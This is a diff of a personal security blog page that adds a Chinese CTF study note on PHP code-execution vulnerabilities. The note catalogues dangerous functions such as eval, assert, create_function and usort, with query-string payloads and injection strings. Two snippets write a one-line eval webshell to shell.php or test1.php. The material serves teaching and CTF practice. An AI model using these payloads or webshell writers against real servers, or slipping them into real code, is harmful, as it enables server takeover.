@@ -21,17 +21,26 @@
     <meta name="keywords" content="hexo,HackerQWQ,blog,CTFer">
     
     <meta name="description" content="">
-    <meta property="og:type" content="website">
-<meta property="og:title" content="Hexo">
-<meta property="og:url" content="https://hackerqwq.github.io/tags/%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/index.html">
+    <meta name="description" content="代码执行漏洞形成原因：客户端提交的参数，未经任何过滤，传入可以执行代码的函数，造成代码执行漏洞。常见代码注射函数：如：eval、preg_replace+&#x2F;e、assert、call_user_func、call_user_func_array、create_function等函数漏洞危害：执行代码，写入webshell、控制服务器 代码执行的几种方式123456789$&amp;#123;&amp;#125;执">
+<meta property="og:type" content="article">
+<meta property="og:title" content="代码执行小总结">
+<meta property="og:url" content="https://hackerqwq.github.io/2021/04/23/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%B0%8F%E6%80%BB%E7%BB%93/index.html">
 <meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="代码执行漏洞形成原因：客户端提交的参数，未经任何过滤，传入可以执行代码的函数，造成代码执行漏洞。常见代码注射函数：如：eval、preg_replace+&#x2F;e、assert、call_user_func、call_user_func_array、create_function等函数漏洞危害：执行代码，写入webshell、控制服务器 代码执行的几种方式123456789$&amp;#123;&amp;#125;执">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://hackerqwq.github.io/2021/04/23/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%B0%8F%E6%80%BB%E7%BB%93/1.png">
+<meta property="og:image" content="https://hackerqwq.github.io/2021/04/23/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%B0%8F%E6%80%BB%E7%BB%93/2.png">
+<meta property="article:published_time" content="2021-04-23T13:56:12.000Z">
+<meta property="article:modified_time" content="2021-04-23T14:04:01.044Z">
 <meta property="article:author" content="HacKerQWQ">
+<meta property="article:tag" content="ctf">
+<meta property="article:tag" content="代码执行">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://hackerqwq.github.io/2021/04/23/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%B0%8F%E6%80%BB%E7%BB%93/1.png">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
     
-    <title>HacKerQWQ&#39;s Studio</title>
+    <title>代码执行小总结 · HacKerQWQ&#39;s Studio</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -212,12 +221,23 @@
 <meta name="generator" content="Hexo 5.2.0"></head>
 
     
+        <body class="post-body">
+    
     
 <header class="header">
 
     <div class="read-progress"></div>
     <div class="header-sidebar-menu">&#xe775;</div>
     <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >HacKerQWQ的博客空间</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">代码执行小总结</a>
+            </div>
+    </div>
     
     <a class="home-link" href=/>HacKerQWQ的博客空间</a>
 </header>
@@ -229,24 +249,76 @@
 
 
 
+
+height:50vh;
 ">
     
     <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
             
     <div class="site-intro-placeholder"></div>
-    <div class="site-intro-img" style="background-image: url(/)"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
     <div class="site-intro-meta">
         <!-- 标题  -->
         <h1 class="intro-title">
             <!-- 主页  -->
+            
+            代码执行小总结
+            <!-- 404 -->
             
         </h1>
         <!-- 副标题 -->
         <p class="intro-subtitle">
             <!-- 主页副标题  -->
             
+            
+            <!-- 404 -->
+            
         </p>
         <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "ctf">ctf</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "代码执行">代码执行</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>Word count: <span class="post-count word-count">915</span>Reading time: <span class="post-count reading-time">4 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2021/04/23</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
         
     </div>
 </div>
@@ -347,52 +419,120 @@
 </script>        
         <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
         <div class="container container-unloaded">
-            <main class="main index-page">
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2020/08/07/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E6%95%B4%E7%90%86%EF%BC%88%E6%9B%B4%E6%96%B0-%EF%BC%89/" >
             
-                <span>命令注入及远程代码执行大集合！</span>
-        </a>
-        <div class="abstract-content">
-            代码执行PHP危险函数
-phpinfo()功能描述：输出 PHP 环境信息以及相关的模块、WEB 环境等信息。危险等级：中 
+<main class="main post-page">
+    <article class="article-entry">
+        <h1 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h1><p>漏洞形成原因：客户端提交的参数，未经任何过滤，传入可以执行代码的函数，造成代码执行漏洞。<br>常见代码注射函数：<br>如：<code>eval</code>、<code>preg_replace+/e</code>、<code>assert</code>、<code>call_user_func</code>、<code>call_user_func_array</code>、<code>create_function</code>等函数<br>漏洞危害：执行代码，写入webshell、控制服务器</p>
+<h1 id="代码执行的几种方式"><a href="#代码执行的几种方式" class="headerlink" title="代码执行的几种方式"></a>代码执行的几种方式</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$&#123;&#125;执行代码<span class="comment">//低版本</span></span><br><span class="line"><span class="keyword">eval</span></span><br><span class="line">assert()</span><br><span class="line">preg_replace()</span><br><span class="line">create_function()</span><br><span class="line">array_map()</span><br><span class="line">call_user_func()/call_user_func_array()</span><br><span class="line">array_filter()</span><br><span class="line">usort(),uasort()</span><br></pre></td></tr></table></figure>
+<h3 id="执行代码"><a href="#执行代码" class="headerlink" title="${}执行代码"></a>${}执行代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;phpinfo()&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="eval-执行代码"><a href="#eval-执行代码" class="headerlink" title="eval()执行代码"></a><code>eval()执行代码</code></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="string">&#x27;echo 2;&#x27;</span>);</span><br></pre></td></tr></table></figure>
+<h3 id="assert-执行代码"><a href="#assert-执行代码" class="headerlink" title="assert()执行代码"></a><code>assert()</code>执行代码</h3><p>assert支持普通调用和动态调用<br>普通调用</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//?a=phpinfo()</span></span><br><span class="line"><span class="meta">&lt;?php</span> assert($_POST[<span class="string">&#x27;a&#x27;</span>]);<span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+<p>动态调用</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//?a=phpinfo()</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="string">&#x27;assert&#x27;</span>;</span><br><span class="line">$a($_POST[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace()"></a>preg_replace()</h3><p>preg_replace用于正则表达式的搜索和替换，关键在于有没有用<code>/e</code>修饰符，如果没用<code>/e</code>修饰符，代码不会执行</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$a = <span class="string">&#x27;phpinfo()&#x27;</span>;</span><br><span class="line">$b = preg_replace(<span class="string">&quot;/abc/e&quot;</span>,$a,<span class="string">&#x27;abcd&#x27;</span>);</span><br></pre></td></tr></table></figure>
+<h3 id="create-function"><a href="#create-function" class="headerlink" title="create_function()"></a>create_function()</h3><p>用法：</p>
+<blockquote>
+<p>string create_function ( string $args , string $code )<br>这个函数用于创建匿名函数并且赋给一个变量<br>内部实现：</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$b = create_function(<span class="string">&#x27;$name&#x27;</span>,<span class="string">&#x27;echo $name;&#x27;</span>);</span><br><span class="line"><span class="comment">//实现</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">niming</span>(<span class="params">$name</span>)</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> $name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$b(yang);</span><br><span class="line"></span><br><span class="line">niming(<span class="string">&#x27;yang&#x27;</span>);</span><br></pre></td></tr></table></figure>
+<p>当create_function()不正确使用时，可以远程代码执行：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$id=$_GET[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"></span><br><span class="line">$code = <span class="string">&#x27;echo $name. &#x27;</span>.<span class="string">&#x27;的编号是&#x27;</span>.$id.<span class="string">&#x27;; &#x27;</span>;</span><br><span class="line"></span><br><span class="line">$b = create_function(<span class="string">&#x27;$name&#x27;</span>,$code);</span><br><span class="line"><span class="comment">//实现</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">niming</span>(<span class="params">$name</span>)</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> $name.<span class="string">&quot;编号&quot;</span>.$id;</span><br><span class="line">&#125;</span><br><span class="line">$b(<span class="string">&#x27;sd&#x27;</span>);</span><br></pre></td></tr></table></figure>
+<p>传入id=2;}phpinfo();/*<br>其中<code>/*</code>作用是注释掉后面的}号以及后面的代码<br>传入后结果：<br><img src="/2021/04/23/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%B0%8F%E6%80%BB%E7%BB%93/1.png"></p>
+<h3 id="array-map"><a href="#array-map" class="headerlink" title="array_map()"></a>array_map()</h3><p>用法：</p>
+<blockquote>
+<p>array array_map ( callable $callback , array $array1 [, array $… ] )</p>
+</blockquote>
+<p>array_map()：返回数组，是为 array1 每个元素应用 callback函数之后的数组。 callback 函数形参的数量和传给 array_map() 数组数量，两者必须一样。<br>示例：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//?a=assert&amp;b=phpinfo();</span></span><br><span class="line">$a = $_GET[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">$b = $_GET[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line">$array[<span class="number">0</span>] = $b;</span><br><span class="line">$c = array_map($a,$array);</span><br></pre></td></tr></table></figure>
+<h3 id="call-user-func-call-user-func-array"><a href="#call-user-func-call-user-func-array" class="headerlink" title="call_user_func()/call_user_func_array()"></a>call_user_func()/call_user_func_array()</h3><p>用法跟array_map()差不多</p>
+<blockquote>
+<p>mixed call_user_func ( callable $callback [, mixed $parameter [, mixed $… ]] )<br>第一个参数 callback 是被调用的回调函数，其余参数是回调函数的参数。<br>mixed call_user_func_array ( callable $callback , array $param_arr )<br>把第一个参数作为回调函数（callback）调用，把参数数组作（param_arr）为回调函数的的参数传入。</p>
+</blockquote>
+<p>call_user_func()</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//?a=phpinfo();</span></span><br><span class="line">call_user_func(assert,$GET[<span class="string">&#x27;a&#x27;</span>]);</span><br></pre></td></tr></table></figure>
+<p>call_user_func_array()</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//?a=phpinfo();</span></span><br><span class="line">$array[<span class="number">0</span>] = $_GET[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"></span><br><span class="line">call_user_func_array(<span class="string">&quot;assert&quot;</span>,$array); </span><br></pre></td></tr></table></figure>
+<h3 id="array-filter"><a href="#array-filter" class="headerlink" title="array_filter()"></a>array_filter()</h3><p>说明：</p>
+<blockquote>
+<p>array array_filter ( array $array [, callable $callback [, int $flag = 0 ]] )<br>依次将 array 数组中的每个值传递到 callback 函数。如果 callback 函数返回 true，则 array 数组的当前值会被包含在返回的结果数组中。数组的键名保留不变。 </p>
+</blockquote>
+<p>示例：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$array[<span class="number">0</span>] = $_GET[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">array_filter($array,<span class="string">&#x27;assert&#x27;</span>);</span><br></pre></td></tr></table></figure>
+<h3 id="usort-uasort"><a href="#usort-uasort" class="headerlink" title="usort()/uasort()"></a>usort()/uasort()</h3><p>usort说明：</p>
+<blockquote>
+<p>bool usort ( array &amp;$array , callable $value_compare_func )<br>本函数将用用户自定义的比较函数对一个数组中的值进行排序。 如果要排序的数组需要用一种不寻常的标准进行排序，那么应该使用此函数。</p>
+</blockquote>
+<p>用法一：<br>php5.6以上可以使用，其中<code>...$_GET</code>是php5.6引入的新特性，作用是将数组展开称参数的形式</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F; ?1[]&#x3D;test&amp;1[]&#x3D;phpinfo();&amp;2&#x3D;assert</span><br><span class="line">usort(...$_GET);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>用法二：<br>php5.6以下使用</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ?1=1+1&amp;2=phpinfo();</span></span><br><span class="line">usort($_GET,<span class="string">&#x27;asse&#x27;</span>.<span class="string">&#x27;rt&#x27;</span>);</span><br></pre></td></tr></table></figure>
+<h3 id="反引号执行"><a href="#反引号执行" class="headerlink" title="反引号执行"></a>反引号执行</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">&quot;echo @`whoami`;&quot;</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2021/04/23/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%B0%8F%E6%80%BB%E7%BB%93/2.png"></p>
+<h3 id="文件操作函数"><a href="#文件操作函数" class="headerlink" title="文件操作函数"></a>文件操作函数</h3><p><code>file_put_contents()</code> 函数把一个字符串写入文件中。<br><code>fputs()</code> 函数写入文件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$test=<span class="string">&#x27;&lt;?php eval($_POST[cmd]);?&gt;&#x27;</span>;</span><br><span class="line">file_put_contents(<span class="string">&#x27;test1.php&#x27;</span>,$test);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">fputs(fopen(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php eval($_POST[cmd])?&gt;&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="动态调用assert"><a href="#动态调用assert" class="headerlink" title="动态调用assert"></a>动态调用assert</h3><p>php7.0版本前assert可动态调用</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//?a=assert&amp;b=phpinfo()</span></span><br><span class="line">$_GET[<span class="string">&#x27;a&#x27;</span>]($_GET[<span class="string">&#x27;b&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h2 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h2><ul>
+<li>system</li>
+<li>popen</li>
+<li>subprocess.call</li>
+<li>spawn</li>
+</ul>
+<h2 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h2><ul>
+<li>java.lang.Runtime.getRuntime().exec(command)</li>
+</ul>
 
-passthru()功能描述：允许执行一个外部程序并回显输出，类似于 exec()。危险等级：高 
-
-exec()功能描述：允许执行一个外部程序（如 UNIX Shell 或 CMD 命令等）。危险等级：高 
-
-system()功能描述：允许执行一个外部程序并回显输出，类似于 passthru()。危险等级：高 
-
-chroot()功能描述：可改变当前 PHP 进程的工作根目录，仅当系统支持 CLI 模式PHP 时才能工作，且该函数不适用于 Windows 系统...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2020/08/07</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "ctf">ctf</a>
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "命令注入">命令注入</a>
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "远程代码执行">远程代码执行</a>
-    
-</div>
-            
-        </div>
     </article>
+    <!-- license  -->
+    
+        <div class="license-wrapper">
+            <p>Author：<a href="https://hackerqwq.github.io">HacKerQWQ</a>
+            <p>原文链接：<a href="https://hackerqwq.github.io/2021/04/23/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%B0%8F%E6%80%BB%E7%BB%93/">https://hackerqwq.github.io/2021/04/23/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%B0%8F%E6%80%BB%E7%BB%93/</a>
+            <p>发表日期：<a href="https://hackerqwq.github.io/2021/04/23/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%B0%8F%E6%80%BB%E7%BB%93/">April 23rd 2021, 9:56:12 pm</a>
+            <p>更新日期：<a href="https://hackerqwq.github.io/2021/04/23/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%B0%8F%E6%80%BB%E7%BB%93/">April 23rd 2021, 10:04:01 pm</a>
+            <p>版权声明：本文采用<a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
     
     <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href= "/2021/04/24/%E5%BC%B1%E7%B1%BB%E5%9E%8B%E6%AF%94%E8%BE%83%E5%B0%8F%E7%AC%94%E8%AE%B0/" title= "弱类型比较小笔记">
+                    <div class="nextTitle">弱类型比较小笔记</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/2021/04/20/nodejs%E5%88%A9%E7%94%A8%E5%B0%8F%E6%80%BB%E7%BB%93/" title= "nodejs利用小总结">
+                    <div class="prevTitle">nodejs利用小总结</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
     
+    
+    <!-- gitalk评论 -->
+
+    <!-- utteranc评论 -->
+
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
 </main>
             <!-- profile -->
             
@@ -481,6 +621,24 @@ chroot()功能描述：可改变当前 PHP 进程的工作根目录，仅当系�
 </footer>
     </div>
     <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="toc-number">1.</span> <span class="toc-text">代码执行</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F"><span class="toc-number">2.</span> <span class="toc-text">代码执行的几种方式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81"><span class="toc-number">2.0.1.</span> <span class="toc-text">${}执行代码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#eval-%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81"><span class="toc-number">2.0.2.</span> <span class="toc-text">eval()执行代码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#assert-%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81"><span class="toc-number">2.0.3.</span> <span class="toc-text">assert()执行代码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#preg-replace"><span class="toc-number">2.0.4.</span> <span class="toc-text">preg_replace()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#create-function"><span class="toc-number">2.0.5.</span> <span class="toc-text">create_function()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#array-map"><span class="toc-number">2.0.6.</span> <span class="toc-text">array_map()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#call-user-func-call-user-func-array"><span class="toc-number">2.0.7.</span> <span class="toc-text">call_user_func()&#x2F;call_user_func_array()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#array-filter"><span class="toc-number">2.0.8.</span> <span class="toc-text">array_filter()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#usort-uasort"><span class="toc-number">2.0.9.</span> <span class="toc-text">usort()&#x2F;uasort()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BC%95%E5%8F%B7%E6%89%A7%E8%A1%8C"><span class="toc-number">2.0.10.</span> <span class="toc-text">反引号执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E5%87%BD%E6%95%B0"><span class="toc-number">2.0.11.</span> <span class="toc-text">文件操作函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%A8%E6%80%81%E8%B0%83%E7%94%A8assert"><span class="toc-number">2.0.12.</span> <span class="toc-text">动态调用assert</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Python"><span class="toc-number">2.1.</span> <span class="toc-text">Python</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Java"><span class="toc-number">2.2.</span> <span class="toc-text">Java</span></a></li></ol></li></ol>
+    </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
     <div class="sidebar sidebar-hide">
@@ -1774,9 +1932,47 @@ chroot()功能描述：可改变当前 PHP 进程的工作根目录，仅当系�
     
     
     
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 84
+        Total : 86
         </div>
         <!-- search  -->
         
@@ -1793,6 +1989,16 @@ chroot()功能描述：可改变当前 PHP 进程的工作根目录，仅当系�
     
     <div class="archive-year"> 2021 </div>
     <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/24</span><a class="archive-post-title" href= "/2021/04/24/%E5%BC%B1%E7%B1%BB%E5%9E%8B%E6%AF%94%E8%BE%83%E5%B0%8F%E7%AC%94%E8%AE%B0/" >弱类型比较小笔记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/23</span><a class="archive-post-title" href= "/2021/04/23/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%B0%8F%E6%80%BB%E7%BB%93/" >代码执行小总结</a>
+        </li>
     
     
         <li class="archive-post-item">
@@ -2130,7 +2336,7 @@ chroot()功能描述：可改变当前 PHP 进程的工作根目录，仅当系�
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">08/07</span><a class="archive-post-title" href= "/2020/08/07/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E6%95%B4%E7%90%86%EF%BC%88%E6%9B%B4%E6%96%B0-%EF%BC%89/" >命令注入及远程代码执行大集合！</a>
+            <span class="archive-post-date">08/07</span><a class="archive-post-title" href= "/2020/08/07/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E6%95%B4%E7%90%86%EF%BC%88%E6%9B%B4%E6%96%B0-%EF%BC%89/" >命令执行小总结</a>
         </li>
     
     
@@ -2232,9 +2438,9 @@ chroot()功能描述：可改变当前 PHP 进程的工作根目录，仅当系�
     
         <span class="sidebar-tag-name" data-tags="sql"><span class="iconfont-archer">&#xe606;</span>sql</span>
     
-        <span class="sidebar-tag-name" data-tags="PHP反序列化"><span class="iconfont-archer">&#xe606;</span>PHP反序列化</span>
-    
         <span class="sidebar-tag-name" data-tags="jwt"><span class="iconfont-archer">&#xe606;</span>jwt</span>
+    
+        <span class="sidebar-tag-name" data-tags="PHP反序列化"><span class="iconfont-archer">&#xe606;</span>PHP反序列化</span>
     
         <span class="sidebar-tag-name" data-tags="2020CISCN"><span class="iconfont-archer">&#xe606;</span>2020CISCN</span>
     
@@ -2252,11 +2458,11 @@ chroot()功能描述：可改变当前 PHP 进程的工作根目录，仅当系�
     
         <span class="sidebar-tag-name" data-tags="shtml"><span class="iconfont-archer">&#xe606;</span>shtml</span>
     
-        <span class="sidebar-tag-name" data-tags="png结构"><span class="iconfont-archer">&#xe606;</span>png结构</span>
+        <span class="sidebar-tag-name" data-tags="Crypto"><span class="iconfont-archer">&#xe606;</span>Crypto</span>
     
         <span class="sidebar-tag-name" data-tags="CRC32"><span class="iconfont-archer">&#xe606;</span>CRC32</span>
     
-        <span class="sidebar-tag-name" data-tags="Crypto"><span class="iconfont-archer">&#xe606;</span>Crypto</span>
+        <span class="sidebar-tag-name" data-tags="png结构"><span class="iconfont-archer">&#xe606;</span>png结构</span>
     
         <span class="sidebar-tag-name" data-tags="intro"><span class="iconfont-archer">&#xe606;</span>intro</span>
     
@@ -2270,15 +2476,15 @@ chroot()功能描述：可改变当前 PHP 进程的工作根目录，仅当系�
     
         <span class="sidebar-tag-name" data-tags="代码审计"><span class="iconfont-archer">&#xe606;</span>代码审计</span>
     
-        <span class="sidebar-tag-name" data-tags="源码泄露"><span class="iconfont-archer">&#xe606;</span>源码泄露</span>
-    
         <span class="sidebar-tag-name" data-tags="SSTI"><span class="iconfont-archer">&#xe606;</span>SSTI</span>
+    
+        <span class="sidebar-tag-name" data-tags="源码泄露"><span class="iconfont-archer">&#xe606;</span>源码泄露</span>
     
         <span class="sidebar-tag-name" data-tags="JAJA"><span class="iconfont-archer">&#xe606;</span>JAJA</span>
     
